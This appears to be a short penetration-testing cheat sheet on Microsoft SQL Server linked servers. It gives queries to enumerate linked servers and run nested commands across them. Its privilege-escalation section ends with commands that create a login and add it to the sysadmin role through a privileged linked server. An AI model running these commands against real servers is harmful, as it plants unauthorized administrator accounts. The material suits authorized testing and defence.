---
title: "MSSQL Linked Servers"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "linked_server", "privesc"]
---

---
###  Linked Servers

#### Basic Commands

<small>*Hint: Use double `''` to escape `'` in mssql*</small>

```mysql
# Show current server
select @@servername
```

```mysql
# Show linked servers
select srvname from sysservers;
```

#### Execute Query between Linked Servers

```mysql
# Execute query from current server to linked server
EXECUTE ('select @@version;') at [LINKED_SERVER];
```

```mysql
# Execute query from linked server to current server
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [CURRENT_SERVER]') at [LINKED_SERVER];
```

### Privilege Escalation

#### Create Admin User from Privilege Linked Server

```mysql
EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!@'''';'') AT [CURRENT_SERVER]') AT [LINKED_SERVER]
```

```mysql
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''test'''', ''''sysadmin'''''') AT [CURRENT_SERVER]') AT [LINKED_SERVER]
```